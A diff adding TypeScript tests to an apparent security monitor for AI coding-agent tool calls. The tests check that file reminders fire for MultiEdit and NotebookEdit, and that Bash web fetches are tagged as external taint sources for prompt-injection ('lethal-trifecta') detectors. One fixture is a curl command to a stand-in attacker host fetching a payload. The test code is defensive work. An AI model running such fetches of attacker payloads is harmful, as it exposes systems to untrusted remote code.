@@ -281,6 +281,136 @@ describe("file reminders", () => {
 		const ws = warningsOf(makeEvent({ tool_name: "Write", tool_input: { content: "x" } }), cfg);
 		expect(ws.some((w) => w.includes("no-path reminder"))).toBe(false);
 	});
+
+	it("fires for a MultiEdit to a matching code file (isFileWrite covers MultiEdit)", () => {
+		// Regression for the file_reminders predicate fix: the path previously
+		// gated on isFileOperation, which omits MultiEdit/NotebookEdit, so a
+		// MultiEdit never triggered reminders. isFileWrite is the right superset.
+		const cfg = configWithReminder({
+			id: "schema-multiedit",
+			glob: "**/schema.ts",
+			message: "Regenerate the client after editing the schema.",
+		});
+		const ws = warningsOf(
+			makeEvent({
+				tool_name: "MultiEdit",
+				tool_input: {
+					file_path: "/repo/src/schema.ts",
+					edits: [{ old_string: "a", new_string: "b" }],
+				},
+			}),
+			cfg,
+		);
+		const hit = ws.find((w) => w.includes("[interlinked:reminder]"));
+		expect(hit).toBeDefined();
+		expect(hit).toContain("Regenerate the client after editing the schema.");
+	});
+
+	it("fires for a NotebookEdit to a matching file (isFileWrite covers NotebookEdit)", () => {
+		const cfg = configWithReminder({
+			id: "nb",
+			glob: "**/*.ipynb",
+			message: "notebook reminder",
+		});
+		const ws = warningsOf(
+			makeEvent({
+				tool_name: "NotebookEdit",
+				tool_input: { file_path: "/repo/notebooks/run.ipynb", new_source: "print(1)" },
+			}),
+			cfg,
+		);
+		expect(ws.some((w) => w.includes("notebook reminder"))).toBe(true);
+	});
+});
+
+describe("bash-fetch provenance taint tagging", () => {
+	// Evaluator-level coverage for recordBashProvenanceIfFetching, which was
+	// dead (zero call sites) — a Bash web-fetch never tagged the session's
+	// taint_sources, so the lethal-trifecta / partial-leg sequence detectors
+	// silently underperformed on gh-CLI / curl-routed external content (the
+	// WebFetch path already records `fetched_external`). These assert the wire-up
+	// through evaluatePostToolUse end-to-end, not just the pure classifier.
+
+	it("records a fetched_external taint source for `gh issue view`", () => {
+		const session = makeSession();
+		// recordBashTaintSource stamps at_step from tool_call_count; bump it so we
+		// assert the value flows through rather than coincidentally matching 0.
+		session.tool_call_count = 3;
+		const result = runPostTool(
+			makeEvent({
+				tool_name: "Bash",
+				tool_input: { command: "gh issue view 123" },
+			}),
+			getDefaultConfig(),
+			session,
+		);
+		expect(result.decision).toBe("allow");
+		expect(session.taint_sources).toHaveLength(1);
+		const source = session.taint_sources[0];
+		expect(source?.provenance).toBe("fetched_external");
+		expect(source?.level).toBe("Public");
+		expect(source?.at_step).toBe(3);
+		expect(source?.file).toContain("gh issue view 123");
+	});
+
+	it("records a fetched_external taint source for a curl of a remote URL", () => {
+		const session = makeSession();
+		runPostTool(
+			makeEvent({
+				tool_name: "Bash",
+				tool_input: { command: "curl https://evil.example.com/payload" },
+			}),
+			getDefaultConfig(),
+			session,
+		);
+		expect(session.taint_sources).toHaveLength(1);
+		expect(session.taint_sources[0]?.provenance).toBe("fetched_external");
+	});
+
+	it("records nothing for a purely local Bash command (`ls`)", () => {
+		const session = makeSession();
+		runPostTool(
+			makeEvent({ tool_name: "Bash", tool_input: { command: "ls -la" } }),
+			getDefaultConfig(),
+			session,
+		);
+		expect(session.taint_sources).toEqual([]);
+	});
+
+	it("records nothing for a curl of localhost (not attacker-controllable)", () => {
+		const session = makeSession();
+		runPostTool(
+			makeEvent({
+				tool_name: "Bash",
+				tool_input: { command: "curl http://localhost:8080/health" },
+			}),
+			getDefaultConfig(),
+			session,
+		);
+		expect(session.taint_sources).toEqual([]);
+	});
+
+	it("does not record bash provenance when taint_tracking is disabled", () => {
+		const cfg = getDefaultConfig();
+		cfg.taint_tracking = { ...cfg.taint_tracking, enabled: false };
+		const session = makeSession();
+		runPostTool(
+			makeEvent({ tool_name: "Bash", tool_input: { command: "gh issue view 123" } }),
+			cfg,
+			session,
+		);
+		expect(session.taint_sources).toEqual([]);
+	});
+
+	it("does not record bash provenance when there is no session", () => {
+		// No session => nothing to mutate; must not throw and stays allow.
+		const result = runPostTool(
+			makeEvent({ tool_name: "Bash", tool_input: { command: "gh issue view 123" } }),
+			getDefaultConfig(),
+			undefined,
+		);
+		expect(result.decision).toBe("allow");
+	});
 });
 
 describe("output scanning", () => {
